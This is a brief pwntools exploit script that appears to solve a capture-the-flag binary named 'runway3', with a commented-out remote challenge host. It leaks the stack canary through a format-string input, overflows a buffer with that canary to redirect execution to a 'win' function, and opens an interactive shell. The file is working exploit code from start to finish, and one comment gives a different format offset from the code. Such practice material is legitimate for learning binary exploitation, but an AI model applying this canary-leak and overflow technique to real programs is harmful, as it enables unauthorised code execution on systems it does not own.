from pwn import *

# Setup binary and context
context.binary = './runway3'
elf = context.binary

# Start the process
p = process('./runway3')
# p = remote('challs.pwnoh.io', 13403)

# Leak the canary value by sending a format string
p.recvuntil('here?\n')
p.sendline(b'%13$p')  # Leak the canary at %12$p
canary = int(p.recvline().strip(), 16)  # Convert the leaked canary to integer
print(canary)

# Print the leaked canary value
print(f"Leaked canary: {hex(canary)}")

payload = b'A'*40 + p64(canary) + b'b'*8 + p64(elf.symbols['win'] + 0x17)

# Send the payload to overflow the buffer
p.sendline(payload)

# Enter interactive mode to interact with the shell
# print(p.recv())
p.interactive()
